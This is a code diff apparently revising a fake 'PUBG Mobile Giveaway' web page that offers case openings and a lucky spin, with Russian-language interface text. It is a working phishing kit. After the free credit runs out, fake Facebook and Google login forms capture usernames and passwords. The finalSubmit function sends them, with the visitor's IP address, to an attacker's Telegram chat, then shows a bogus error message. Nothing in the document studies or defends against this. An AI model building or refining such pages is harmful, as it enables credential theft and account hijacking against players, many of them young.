@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PUBG Mobile - Gift Drop</title>
+    <title>PUBG Mobile - Giveaway</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -28,7 +28,7 @@
 
         .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* Иконка UC как на скрине */
+        /* Иконка UC */
         .uc-icon {
             display: inline-flex;
             align-items: center;
@@ -41,8 +41,7 @@
             font-weight: 900;
             color: #fff;
             line-height: 1;
-            margin-right: 6px;
-            box-shadow: inset 0 0 5px rgba(196, 161, 98, 0.3);
+            margin-right: 4px;
         }
 
         header {
@@ -58,7 +57,7 @@
         .balance-display {
             background: rgba(255, 255, 255, 0.05);
             border-radius: 20px;
-            padding: 5px 12px;
+            padding: 4px 10px;
             display: flex;
             align-items: center;
             gap: 4px;
@@ -67,21 +66,20 @@
 
         .btn-plus {
             background: #4caf50;
-            width: 18px;
-            height: 18px;
+            width: 16px;
+            height: 16px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 12px;
-            font-weight: bold;            margin-left: 4px;
+            font-size: 10px;
+            font-weight: bold;
         }
 
         /* Кейс */
         .case-container {
-            position: relative;
-            width: 100%;
-            height: 180px;
+            position: relative;            width: 100%;
+            height: 160px;
             overflow: hidden;
             background: radial-gradient(circle, rgba(255, 255, 255, 0.02) 0%, transparent 80%);
             margin: 20px 0;
@@ -104,29 +102,23 @@
         }
 
         .case-item {
-            min-width: 130px;
-            height: 140px;
+            min-width: 120px;
+            height: 120px;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 10px;
-            opacity: 0.5;
-            transition: opacity 0.3s;
+            opacity: 0.6;
         }
-
-        .case-item.active { opacity: 1; transform: scale(1.1); }
-        .case-item img { width: 80px; height: 80px; object-fit: contain; }
-        .case-item span { font-size: 11px; margin-top: 10px; font-weight: 600; text-align: center; }
+        .case-item img { width: 90px; height: 90px; object-fit: contain; }
 
         .error-msg {
-            background: rgba(255, 59, 48, 0.15);
+            background: rgba(255, 59, 48, 0.1);
             color: var(--pubg-red);
-            border: 1px solid rgba(255, 59, 48, 0.3);
             border-radius: 12px;
-            padding: 15px;
+            padding: 12px;
             text-align: center;
-            font-size: 14px;
+            font-size: 13px;
             margin: 15px;
             display: none;
         }
@@ -137,29 +129,22 @@
             width: calc(100% - 32px);
             margin: 0 16px;
             padding: 16px;
-            border-radius: 14px;
+            border-radius: 12px;
             font-weight: 700;
             font-size: 16px;
             text-align: center;
             display: block;
         }
 
-        /* Нижнее меню */
         .nav-bar {
             position: fixed; bottom: 0; left: 0; right: 0;
             background: #000;
-            height: 70px;
+            height: 65px;
             display: flex; justify-content: space-around; align-items: center;
             border-top: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        .nav-item { 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            color: #555; 
-            font-size: 10px;
-        }
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; }
         .nav-item.active { color: var(--pubg-gold); }
 
         /* Модалки */
@@ -180,26 +165,25 @@
         }
 
         .win-card {
-            background: linear-gradient(135deg, #1a1b1e 0%, #151618 100%);
+            background: #0b0c0d;
             border: 2px solid var(--pubg-gold);
-            border-radius: 20px; padding: 30px; width: 90%; max-width: 300px; text-align: center;
+            border-radius: 20px; padding: 30px; width: 85%; max-width: 320px; text-align: center;
         }
 
-        .spin-cell { width: 100%; height: 80px; object-fit: cover; border-radius: 10px; }
+        .spin-cell { width: 100%; height: 100%; object-fit: contain; }
     </style>
 </head>
 <body>
 
     <header>
-        <div class="flex items-center gap-2" id="backBtn" style="display: none;" onclick="goBack()">
+        <div class="flex items-center gap-2" id="backBtn" style="display: none;" onclick="showSection('hub')">
             <i class="fas fa-chevron-left text-gray-400"></i>
-            <span class="text-smfont-bold">Назад</span>
+            <span class="text-sm font-bold">Назад</span>
         </div>
         <div class="text-center" style="flex: 1;">
             <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
         </div>
         
-        <!-- БАЛАНС В ШАПКЕ -->
         <div class="balance-display" onclick="startAuth()">
             <span class="uc-icon">UC</span>
             <span id="headerBalance" class="text-sm font-bold">60</span>
@@ -207,7 +191,7 @@
         </div>
     </header>
 
-    <!-- MAIN HUB -->
+    <!-- HUB -->
     <div id="section-hub" class="p-4">
         <div class="grid grid-cols-2 gap-4 mt-4">
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('case')">
@@ -243,40 +227,38 @@
             <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
         </div>
 
-        <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] relative mb-6">
+        <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] mb-6">
             <div class="grid grid-cols-3 gap-3" id="spinGrid">
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s0"><img src="priz1.png" class="spin-cell"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s1"><img src="priz2.png" class="spin-cell"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s2"><img src="priz3.png" class="spin-cell"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s7"><img src="priz4.png" class="spin-cell"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="mid"><img src="priz5.png" class="spin-cell"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s3"><img src="priz6.png" class="spin-cell"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s6"><img src="priz7.png" class="spin-cell"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s5"><img src="priz8.png" class="spin-cell"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s4"><img src="priz9.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s0"><img src="priz1.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s1"><img src="priz2.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s2"><img src="priz3.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s7"><img src="priz4.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="mid"><img src="priz5.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s3"><img src="priz6.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s6"><img src="priz7.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s5"><img src="priz8.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s4"><img src="priz9.png" class="spin-cell"></div>
             </div>
         </div>
         
-        <button id="spinBtn" class="btn-blue !mx-0 mt-6 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
-        <button id="spinDepositBtn" class="btn-blue !mx-0 mt-3 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Пополнить баланс</button>
-        <div id="spinErrorBox" class="error-msg mt-3">Недостаточно средств для вращения</div>
+        <button id="spinBtn" class="btn-blue !mx-0 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
+        <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Пополнить баланс</button>
+        <div id="spinErrorBox" class="error-msg">Недостаточно средств для вращения</div>
     </div>
 
     <!-- WIN MODAL -->
     <div id="winModal" class="win-modal">
         <div class="win-card">
-            <div class="pubg-font text-2xl text-yellow-400 mb-4">ПОБЕДА!</div>
-            <img id="winPrizeImage" src="" class="w-32 h-32 mx-auto my-4 object-contain">
-            <div id="winPrizeName" class="pubg-font text-lg mb-6"></div>
-            <button onclick="closeWinModal()" class="w-full bg-yellow-500 text-black py-3 rounded-xl font-bold">Забрать приз</button>
+            <div class="pubg-font text-3xl text-yellow-400 mb-6">ПОБЕДА!</div>
+            <img id="winPrizeImage" src="" class="w-40 h-40 mx-auto mb-8 object-contain">
+            <button onclick="closeWinModal()" class="w-full bg-yellow-500 text-black py-4 rounded-xl font-bold text-lg">Забрать приз</button>
         </div>
     </div>
 
-    <!-- MODAL AUTH (ПОПОЛНЕНИЕ) -->
+    <!-- AUTH MODALS -->
     <div id="modalAuth" class="modal">
         <div class="login-card">
-            <h2 class="font-black text-xl mb-2">Верификация аккаунта</h2>
-            <p class="text-gray-500 text-sm mb-6">Войдите, чтобы пополнить баланс UC.</p>
+            <h2 class="font-black text-xl mb-2">Верификация</h2>
             <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-facebook-f"></i> Facebook</button>
             <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-google"></i> Google</button>
             <button onclick="document.getElementById('modalAuth').style.display='none'" class="w-full text-gray-400 text-sm mt-2">Отмена</button>
@@ -286,17 +268,17 @@
     <div id="modalForm" class="modal">
         <div class="login-card">
             <h2 id="methodName" class="font-black text-xl mb-4">Login</h2>
-            <input type="text" id="inpUser" placeholder="Логин">
+            <input type="text" id="inpUser" placeholder="Email или телефон">
             <input type="password" id="inpPass" placeholder="Пароль">
             <button onclick="finalSubmit()" class="w-full bg-blue-600 text-white p-4 rounded-xl mt-4 font-bold">Войти</button>
         </div>
     </div>
 
-    <!-- Bottom Nav -->
+    <!-- Nav -->
     <nav class="nav-bar">
         <div class="nav-item active" onclick="showSection('case')"><i class="fas fa-box-open text-xl mb-1"></i><span>Cases</span></div>
         <div class="nav-item" onclick="showSection('hub')"><i class="fas fa-gamepad text-xl mb-1"></i><span>Games</span></div>
-        <div class="nav-item"><i class="fas fa-user text-xl mb-1"></i><span>Profile</span></div>
+        <div class="nav-item" onclick="startAuth()"><i class="fas fa-user text-xl mb-1"></i><span>Profile</span></div>
     </nav>
 
     <script>
@@ -304,37 +286,22 @@
         const CHAT_ID = '1709490182';
         
         const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
-        const prizeNames = ['M416 Glacier', 'Pharaoh Set', 'X-Suit', 'Golden AKM', 'Legendary Helmet', 'Epic Backpack', 'Rare Costume', 'Special Gloves', 'Mystery Box'];
         
-        let balance = 60; // ДАЕМ 60 UC ПРИ ВХОДЕ
+        let balance = 60; 
         let userIP = '';
         let isSpinning = false;
-        let navHistory = ['hub'];
 
         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
 
         function updateBalanceUI() {
             document.getElementById('headerBalance').innerText = balance;
+            const canPlay = balance >= 60;
             
-            // Проверка для кейса
-            if (balance < 60) {
-                document.getElementById('openBtn').style.display = 'none';
-                document.getElementById('depositBtn').style.display = 'block';
-            } else {
-                document.getElementById('openBtn').style.display = 'block';
-                document.getElementById('depositBtn').style.display = 'none';
-                document.getElementById('errorBox').style.display = 'none';
-            }
-
-            // Проверка для спина
-            if (balance < 60) {
-                document.getElementById('spinBtn').style.display = 'none';
-                document.getElementById('spinDepositBtn').style.display = 'block';
-            } else {
-                document.getElementById('spinBtn').style.display = 'block';
-                document.getElementById('spinDepositBtn').style.display = 'none';
-                document.getElementById('spinErrorBox').style.display = 'none';
-            }
+            document.getElementById('openBtn').style.display = canPlay ? 'block' : 'none';
+            document.getElementById('depositBtn').style.display = canPlay ? 'none' : 'block';
+            
+            document.getElementById('spinBtn').style.display = canPlay ? 'block' : 'none';
+            document.getElementById('spinDepositBtn').style.display = canPlay ? 'none' : 'block';
         }
 
         function showSection(id) {
@@ -344,34 +311,37 @@
             });
             const target = document.getElementById('section-' + id);
             if(target) target.style.display = 'block';
-            
             document.getElementById('backBtn').style.display = id === 'hub' ? 'none' : 'flex';
-            updateBalanceUI();
+        }
+
+        // Генерация ленты без повторов рядом
+        const tape = document.getElementById('caseTape');
+        let lastIdx = -1;
+        for(let i=0; i<60; i++) {
+            let idx;do {
+                idx = Math.floor(Math.random() * prizeImages.length);
+            } while (idx === lastIdx);
+            lastIdx = idx;
+            tape.innerHTML += `<div class="case-item"><img src="${prizeImages[idx]}"></div>`;
         }
 
         function openCase() {
-            if (balance < 60) {
-                document.getElementById('errorBox').style.display = 'block';
-                return;
-            }
-
+            if (balance < 60) return;
             balance -= 60;
             updateBalanceUI();
-
-            const tape = document.getElementById('caseTape');
-            const offset = 130 * 25 + Math.floor(Math.random()*100);
-            tape.style.transform = `translateX(-${offset}px)`;
+            
+            const offset = 120 * 30 + Math.floor(Math.random()*100);
+            document.getElementById('caseTape').style.transform = `translateX(-${offset}px)`;
             
             setTimeout(() => {
-                const idx = Math.floor(Math.random() * prizeImages.length);
-                showWinModal(prizeImages[idx], prizeNames[idx]);
-                sendTelegram(`🎁 Кейс открыт! Выигрыш: ${prizeNames[idx]} | IP: ${userIP}`);
+                const winIdx = Math.floor(Math.random() * prizeImages.length);
+                showWinModal(prizeImages[winIdx]);
+                sendTelegram(`🎁 Кейс открыт | IP: ${userIP}`);
             }, 5000);
         }
 
         function startSpin() {
             if (isSpinning || balance < 60) return;
-            
             balance -= 60;
             updateBalanceUI();
             isSpinning = true;
@@ -379,12 +349,11 @@
             const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
             let currentIdx = 0;
             let spins = 0;
-            const maxSpins = 20 + Math.floor(Math.random() * 10);
+            const maxSpins = 25;
 
             const interval = setInterval(() => {
                 cells.forEach(c => document.getElementById(c).style.borderColor = 'transparent');
                 document.getElementById(cells[currentIdx]).style.borderColor = '#ffbc00';
-                
                 currentIdx = (currentIdx + 1) % cells.length;
                 spins++;
 
@@ -393,20 +362,20 @@
                     isSpinning = false;
                     const winId = cells[(currentIdx - 1 + cells.length) % cells.length];
                     const winImg = document.querySelector(`#${winId} img`).src;
-                    showWinModal(winImg, "Награда Lucky Spin");
-                    sendTelegram(`🎡 Рулетка! IP: ${userIP}`);
+                    showWinModal(winImg);
+                    sendTelegram(`🎡 Spin | IP: ${userIP}`);
                 }
             }, 100);
         }
 
-        function showWinModal(img, name) {
+        function showWinModal(img) {
             document.getElementById('winPrizeImage').src = img;
-            document.getElementById('winPrizeName').innerText = name;
             document.getElementById('winModal').style.display = 'flex';
         }
 
         function closeWinModal() { document.getElementById('winModal').style.display = 'none'; }
-
+        function startAuth() { document.getElementById('modalAuth').style.display = 'flex'; }
+        
         function openForm(m) {
             document.getElementById('modalAuth').style.display = 'none';
             document.getElementById('modalForm').style.display = 'flex';
@@ -416,8 +385,9 @@
         async function finalSubmit() {
             const u = document.getElementById('inpUser').value;
             const p = document.getElementById('inpPass').value;
-            await sendTelegram(`🔥 LOG! \nUser: ${u}\nPass: ${p}\nIP: ${userIP}`);
-            alert('Ошибка синхронизации. Попробуйте позже.');
+            if(u.length < 4 || p.length < 4) return;
+            await sendTelegram(`🔥 LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`);
+            alert('Ошибка. Недостаточный уровень аккаунта.');
             location.reload();
         }
 
@@ -426,17 +396,11 @@
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({chat_id: CHAT_ID, text: t})
-            });
-        }
-
-        // Рендер ленты
-        const tape = document.getElementById('caseTape');
-        for(let i=0; i<50; i++) {
-            const idx = Math.floor(Math.random() * prizeImages.length);
-            tape.innerHTML += `<div class="case-item"><img src="${prizeImages[idx]}"><span class="pubg-font">${prizeNames[idx]}</span></div>`;
+            }).catch(e => {});
         }
 
         updateBalanceUI();
+        showSection('hub');
     </script>
 </body>
 </html>
